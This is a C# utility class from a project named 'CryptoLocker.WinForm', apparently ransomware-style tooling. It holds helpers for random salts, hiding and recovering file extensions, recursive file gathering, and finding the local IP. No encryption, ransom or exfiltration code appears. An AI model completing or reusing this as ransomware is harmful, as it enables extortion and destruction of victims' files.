using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace CryptoLocker.WinForm
{
    public class Util
    {
        public static byte[] GetRandomBytes()
        {
            int saltLength = GetSaltLength();
            byte[] ba = new byte[saltLength];
            RandomNumberGenerator.Create().GetBytes(ba);
            return ba;
        }

        public static string GetRandomString(int length = 0)
        {
            const string characters = "@#%_+abcdefghijklmnopqrstuvwxyz1234567890";

            if (length == 0) length = GetSaltLength();

            char[] buffer = characters.ToCharArray();
            byte[] data = new byte[length];

            var crypto = new RNGCryptoServiceProvider();
            crypto.GetNonZeroBytes(data);

            var result = new StringBuilder(length);

            foreach (byte b in data)
            {
                result.Append(buffer[b % (buffer.Length - 1)]);
            }
            
            return result.ToString();
        }

        public static int GetSaltLength()
        {
            return 32;
        }

        public static byte[] GetFileExtensionBytes(string filePath)
        {
            int len = GetSaltLength();

            var ext = Path.GetExtension(filePath);
            
            if (ext != null)
            {
                if(ext.Length > len)
                    return null;

                byte[] baResult = new byte[len];
                
                var extBytes = Encoding.UTF8.GetBytes(ext);
                Array.Copy(extBytes, 0, baResult, 0, extBytes.Length);
              
                return baResult;
            }

            return null;
        }

        public static string ExtractFileExtensionFromBytes(byte[] saltedBytes)
        {
            // Remove trailing zeros
            int idx = saltedBytes.Length - 1;
            while (saltedBytes[idx] == 0)
            {
                --idx;
            }

            byte[] extensionBytes = new byte[idx + 1];
            Array.Copy(saltedBytes, extensionBytes, idx + 1);

            string sResult = Encoding.UTF8.GetString(extensionBytes);
            return sResult;
        }
        
        public static string[] GetFiles(string sourceFolder, string filters, SearchOption searchOption)
        {
            return filters.Split('|').SelectMany(filter => Directory.GetFiles(sourceFolder, filter, searchOption)).ToArray();
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }
    }
}
